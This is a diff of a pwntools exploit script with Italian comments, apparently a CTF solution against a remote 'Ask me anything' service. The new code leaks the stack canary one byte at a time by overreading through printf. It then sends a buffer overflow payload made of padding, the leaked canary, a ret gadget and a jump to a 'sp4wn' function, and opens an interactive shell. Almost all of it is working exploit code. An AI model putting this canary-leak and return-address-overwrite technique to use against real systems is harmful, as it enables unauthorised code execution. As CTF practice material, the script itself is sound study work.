@@ -9,30 +9,45 @@ sp4wn      = 0x400897
 p = remote(HOST, PORT)
 p.recvuntil(b'Ask me anything...\n')
 
-# Iterazione 1: scrivi 81 A, sovrascrive \x00 del canary
-# ma printf si ferma se i byte successivi del canary sono \x00
-# Soluzione: scrivi OLTRE il canary per leakare tutto in una volta!
-# Layout: [80 buf][8 canary][8 rbp][8 ret]
-# Scrivi 80+8+1 = 89 byte → sovrascrive canary intero + 1 byte di rbp
-# Così printf legge buf + canary (anche se ha zeri interni) + rbp
+# I byte precedenti rimangono in memoria tra un read() e l'altro!
+# Strategia: scrivi fino al byte N del canary, leggi il leak
+# Poi scrivi fino al byte N+1, ecc.
 
-# Prima passata: leak canary byte per byte sfruttando il loop
-# Manda 81 byte → se canary[1] != 0 lo vediamo, senno mandiamo 82, ecc.
+canary = b'\x00'  # byte 0 sempre \x00
 
-leaked_extra = b''
-for size in range(81, 97):  # fino oltre il canary+rbp
-    p.recvuntil(b'Ask me anything...\n') if size > 81 else None
-    payload = b'A' * size + b'\n'
-    p.send(payload)
+for i in range(1, 8):
+    # Scrivi 80 + i byte: sovrascrive i primi i byte del canary con A
+    # I byte canary[i+1:] sono ancora in memoria dal giro precedente
+    # Quindi printf leggerà: 80 A + i A + canary[i] (se non \x00)
+    payload = b'A' * (80 + i)
+    p.send(payload + b'\n')
     
-    resp = p.recvuntil(b'\n', timeout=3)
-    if b'Sorry' in resp:
-        leaked = resp.split(b'Sorry, "')[1].split(b'" is too long')[0]
-        extra = leaked[size:]
-        print(f'size={size}: extra={extra.hex() if extra else "none"}')
-        if extra:
-            leaked_extra = extra
-            break
-    p.recvuntil(b'Ask me anything...\n')
+    resp = p.recvuntil(b'Ask me anything...\n', timeout=5)
+    leaked = resp.split(b'Sorry, "')[1].split(b'" is too long')[0]
+    extra = leaked[80 + i:]
+    
+    if extra:
+        canary += extra[:1]
+        print(f'[+] Canary byte {i}: {extra[0]:02x}')
+    else:
+        canary += b'\x00'
+        print(f'[+] Canary byte {i}: 00 (null)')
 
-print(f'[+] Leaked after buffer: {leaked_extra.hex()}')
+canary = canary.ljust(8, b'\x00')
+print(f'[+] Canary completo: {canary.hex()}')
+canary_val = u64(canary)
+
+# Exploit
+p.recvuntil(b'Ask me anything...\n')
+
+payload  = b'A' * 80
+payload += p64(canary_val)
+payload += b'B' * 8
+payload += p64(ret_gadget)
+payload += p64(sp4wn)
+
+p.send(payload + b'\n')
+p.recvuntil(b'Ask me anything...\n')
+p.send(b'\n')
+
+p.interactive()
